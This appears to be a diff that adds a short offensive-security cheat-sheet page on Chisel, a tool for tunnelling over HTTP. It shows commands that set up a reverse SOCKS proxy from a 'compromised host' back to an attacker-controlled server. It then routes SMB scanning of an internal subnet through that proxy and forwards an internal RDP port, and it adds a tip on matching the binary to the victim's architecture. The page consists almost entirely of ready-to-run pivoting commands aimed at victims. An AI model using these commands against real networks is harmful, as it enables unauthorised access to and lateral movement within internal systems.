@@ -1,0 +1,23 @@
+---
+title: "Chisel"
+---
+
+TCP/UDP tunnels over HTTP — reach an internal subnet through a compromised host.
+
+```bash
+# Attacker = server (reverse SOCKS)
+./chisel server -p 8080 --reverse
+# Victim = client, opens a reverse SOCKS5 proxy back to you
+./chisel client ATTACKER:8080 R:socks
+# then route tools through 127.0.0.1:1080
+proxychains nxc smb 172.16.5.0/24
+```
+
+```bash
+# Single remote port -> your localhost
+./chisel client ATTACKER:8080 R:3389:172.16.5.19:3389
+```
+
+<Tip>
+Match the chisel binary to the victim's arch. Statically-compiled builds avoid missing-library issues on stripped hosts.
+</Tip>
